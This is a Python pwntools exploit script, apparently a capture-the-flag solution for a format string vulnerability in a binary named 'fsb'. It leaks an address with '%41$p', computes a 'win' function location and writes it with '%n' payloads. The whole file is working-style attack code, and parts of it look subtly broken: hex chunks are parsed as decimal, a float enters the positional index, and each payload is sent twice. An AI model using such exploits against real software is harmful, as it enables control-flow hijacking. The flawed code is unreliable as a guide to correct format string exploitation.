#!/usr/bin/env python3

from pwn import *

exe = ELF("./fsb")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    offset_win_main = 0x12ae - 0x11e9

    r.sendlineafter(b"> ", b"%41$p")
    main = int(r.recvuntil(b"\n")[:-1].decode('utf-8'), 16)
    info(f"main: {hex(main)}")
    main = main - 0x81
    win = hex(main - offset_win_main)[2:]
    info(f"win: {win}")
    for i in range(0, len(win), 4):
        payload = "%"+str(int(win[i:i+4], 10))+"c%"+str(41 + i/2)+"$n"
        r.sendlineafter(b"> ", payload.encode("utf-8"))
        r.sendlineafter(b"> ", payload)

    
    # r.sendlineafter(b"> ")
    # r.interactive()


if __name__ == "__main__":
    main()
